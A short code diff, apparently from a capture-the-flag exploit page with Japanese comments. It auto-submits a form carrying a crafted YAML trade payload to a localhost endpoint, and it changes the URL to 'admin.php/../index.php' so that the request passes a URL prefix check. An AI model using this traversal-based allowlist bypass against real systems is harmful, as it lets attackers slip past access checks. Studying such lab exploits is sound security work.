@@ -13,8 +13,8 @@
   - {amount: 1000000, currency: JP, op: SELL}
   - {amount: 1, currency: FL, op: BUY}`;
 
-          // YAMLを返すエンドポイントURL
-          const yamlUrl = "http://localhost:5000/index.php?html=" + encodeURIComponent(yaml);
+          // URL_PREFIXを満たしながらindex.phpにアクセス
+          const yamlUrl = "http://localhost:5000/admin.php/../index.php?html=" + encodeURIComponent(yaml);
 
           // フォームのurlパラメータを設定して即座に送信
           document.getElementById('attackForm').querySelector('input[name="url"]').value = yamlUrl;
